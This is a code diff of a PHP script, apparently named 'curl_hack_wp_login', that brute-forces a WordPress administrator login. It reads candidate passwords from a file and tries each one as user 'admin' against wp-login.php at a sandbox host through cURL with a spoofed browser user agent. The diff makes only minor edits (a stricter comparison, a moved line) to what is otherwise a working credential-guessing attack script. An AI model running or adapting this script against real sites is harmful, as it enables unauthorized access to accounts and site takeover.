@@ -32,14 +32,14 @@ function curl_hack_wp_login( $login_user, $login_pass, $login_url, $visit_url, $
     #Close the cURL.
     $result = curl_getinfo ($ch);
     curl_close( $ch );
-    if ( urlencode($result['url']) == $visit_url){
+    if ( urlencode($result['url']) === $visit_url){
       #You can echo or return the page data here.
       echo $content;
     }
 }
 
-$password_file = file_get_contents('passwords.txt');
 $login_user = "admin";
+$password_file = file_get_contents('passwords.txt');
 $login_pass = explode(",", $password_file);
 $login_url = "http://sandbox.com/wp-login.php";
 $visit_url = urlencode( 'http://sandbox.com/wp-admin/' );
@@ -49,3 +49,10 @@ $http_agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko
 foreach ( $login_pass as $login ){
   curl_hack_wp_login( $login_user, $login, $login_url, $visit_url, $http_agent, $cookie_file );
 }
+
+
+
+
+
+
+
